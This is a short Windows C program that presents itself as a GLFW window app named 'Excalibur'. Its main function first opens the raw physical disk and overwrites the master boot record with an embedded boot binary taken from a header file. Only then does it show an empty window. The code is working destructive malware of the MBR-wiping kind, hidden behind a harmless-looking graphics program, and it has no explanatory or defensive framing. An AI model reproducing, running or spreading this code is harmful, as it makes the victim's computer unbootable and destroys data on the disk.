#include <windows.h>

#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>

#include <GLFW/glfw3.h>

#define WINDOW_WIDTH 640
#define WINDOW_HEIGHT 360

#include "Boot.h"

static void OverwriteMBR()
{
    HANDLE MBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);

    if (MBR == INVALID_HANDLE_VALUE)
    {
        fprintf(stderr, "[ERR]: Could not open MBR.\n");
        return;
    }
    
    DWORD write;
    if (WriteFile(MBR, bin_boot_bin, bin_boot_bin_len, &write, NULL))
        printf("[INFO]: MBR overwritten.\n");
    else
        printf("[ERR]: Could not overwrite MBR.\n");

    CloseHandle(MBR);
}

int main()
{
    OverwriteMBR();

    glfwInit();
    GLFWwindow* window = glfwCreateWindow(WINDOW_WIDTH, WINDOW_HEIGHT,
                                         "Excalibur", NULL, NULL);
    glfwMakeContextCurrent(window);
    
    while (!glfwWindowShouldClose(window))
    {
        glfwSwapBuffers(window);
        glfwPollEvents();
    }
    
    glfwDestroyWindow(window);
    glfwTerminate();
}
